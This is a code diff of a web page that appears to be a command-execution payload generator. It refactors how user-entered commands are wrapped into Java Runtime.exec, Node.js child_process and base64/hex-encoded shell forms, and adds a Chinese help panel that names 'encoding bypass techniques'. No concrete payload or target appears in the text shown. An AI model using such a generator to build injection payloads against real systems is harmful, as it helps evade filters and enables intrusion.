+                displayPayloadWithCommands('payload3', payload3Data);
 
-        document.getElementById("payload3").value = data3.replace(/ascii_2_Hex_without_black_chars_flag/g, ascii_2_Hex_without_black_chars(cmd_origin)).replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
+                const payload4Data = data4.replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin))
+                    .replace(/arr0w1_cmd_origin/g, cmd_origin)
+                    .replace(/arr0w1_base64/g, cmd_origin_btoa_ed)
+                    .replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
+                displayPayloadWithCommands('payload4', payload4Data);
 
-        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
+                const payload5Data = data5.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                if (payload5Data.trim()) {
+                    displayPayloadWithCommands('payload5', payload5Data);
+                }
 
+                const payload6Data = data6.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+                if (payload6Data.trim()) {
+                    displayPayloadWithCommands('payload6', payload6Data);
+                }
+            } catch (err) {
+                console.error('Error in func_oninput:', err);
+            }
+        }
 
-        document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        // -----
 
-        document.getElementById("payload6").value = data6.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
+        // Add hover effect for payload0 (hardcoded in HTML)
+        (function() {
+            const payload0HintCode = document.querySelector('#payload0-container .hint-code');
+            const payload0CopyBtn = document.querySelector('#payload0-container .copy-btn');
+            if (payload0HintCode && payload0CopyBtn) {
+                payload0HintCode.addEventListener('mouseenter', function () {
+                    payload0CopyBtn.style.opacity = '1';
+                });
+                payload0HintCode.addEventListener('mouseleave', function () {
+                    payload0CopyBtn.style.opacity = '0';
+                });
+                // Also show when hovering over the button itself
+                payload0CopyBtn.addEventListener('mouseenter', function () {
+                    payload0CopyBtn.style.opacity = '1';
+                });
+                payload0CopyBtn.addEventListener('mouseleave', function () {
+                    payload0CopyBtn.style.opacity = '0';
+                });
+            }
+        })();
 
-        auto_grow(document.getElementById("payload0"));
-        auto_grow(document.getElementById("payload1"));
-        auto_grow(document.getElementById("payload2"));
-        auto_grow(document.getElementById("payload3"));
-        auto_grow(document.getElementById("payload4"));
-        auto_grow(document.getElementById("payload5"));
-        auto_grow(document.getElementById("payload6"));
-    }
+        func_oninput();
+    </script>
 
-    // -----
+    <!-- Smart Hint System -->
+    <div id="interactive-hint" class="interactive-hint">
+        <div class="hint-content">
+            <h2>💡 命令执行工具使用说明</h2>
+            <p>输入命令后会自动生成多种格式的payload，包括：</p>
+            <ul>
+                <li>Java Runtime.exec() - String[] 参数类型</li>
+                <li>Java Runtime.exec() - String 参数类型</li>
+                <li>Shell 编码方式（base64、hex等）</li>
+                <li>Node.js child_process.exec()</li>
+                <li>多种编码绕过技术</li>
+            </ul>
+            <button class="hint-close" onclick="toggleHint()">关闭</button>
+        </div>
+    </div>
 
-    func_oninput();
-</script>
+    <script>
+        function toggleHint() {
+            const hint = document.getElementById('interactive-hint');
+            hint.classList.toggle('show');
+        }
+    </script>
 
 </html>
